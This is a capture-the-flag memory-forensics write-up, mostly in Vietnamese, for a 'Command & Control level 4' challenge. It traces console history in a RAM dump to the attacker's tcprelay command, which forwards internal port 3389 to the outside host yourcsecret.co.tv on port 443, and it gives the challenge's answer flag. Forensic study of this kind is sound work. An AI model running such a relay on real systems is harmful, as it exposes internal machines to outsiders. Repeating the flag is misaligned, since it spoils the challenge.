# Command & Control -level  4
Berthier, thanks to this new information about the processes running on the workstation, it’s clear that this malware is used to exfiltrate data. Find out the ip of the internal server targeted by the hackers!

The validation flag should have this format : IP:PORT
## Solution

Tìm kiếm ở Cmdline không thấy có ip nào khả nghi chúng ta sẽ tiến hành tìm kiếm ở conhost.exe(bộ nhớ đệm của cmd )
```
onsoleProcess: conhost.exe Pid: 3228
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 2 HistoryBufferMax: 4
OriginalTitle: Command Prompt
Title: Administrator: Command Prompt - winpmem-1.3.1.exe  ram.dmp
AttachedProcess: winpmem-1.3.1. Pid: 3144 Handle: 0x90
AttachedProcess: cmd.exe Pid: 3152 Handle: 0x64
----
CommandHistory: 0x3007a8 Application: winpmem-1.3.1.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x90
----
CommandHistory: 0x2ff638 Application: cmd.exe Flags: Allocated, Reset
CommandCount: 5 LastAdded: 4 LastDisplayed: 4
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
Cmd #0 at 0x2fcd58: cd %temp%
Cmd #1 at 0x2fd348: dir
Cmd #2 at 0x2e1038: cd imagedump
Cmd #3 at 0x2fd378: dir
Cmd #4 at 0x304870: winpmem-1.3.1.exe ram.dmp
----
Screen 0x2e64b8 X:80 Y:300
Dump:

**************************************************
ConsoleProcess: conhost.exe Pid: 2168
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 1616 Handle: 0x64
----
CommandHistory: 0x427a60 Application: tcprelay.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427890 Application: whoami.exe Flags: 
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427700 Application: cmd.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
----
Screen 0x416348 X:80 Y:300
Dump:

```
Chúng ta có 2 lịch sử của cmd, tiến trình thứ nhất chỉ cơ bản là xem thư mục và dump ram, tiến trình thứ 2 khả nghi hơn vì hacker có dùng tcprelay để chuyển tiếp cổng và whoami để xem thông tin khi chiếm được quyền của máy tính đó

Tiếp theo tiến hành xem lịch trình xử lý của nó trong pid 2168 này 
```
└─$ strings 2168.dmp| grep tcprelay                                        
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443 
tcprelay.c
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
                                              
```

Đáp án 192.168.0.22:3389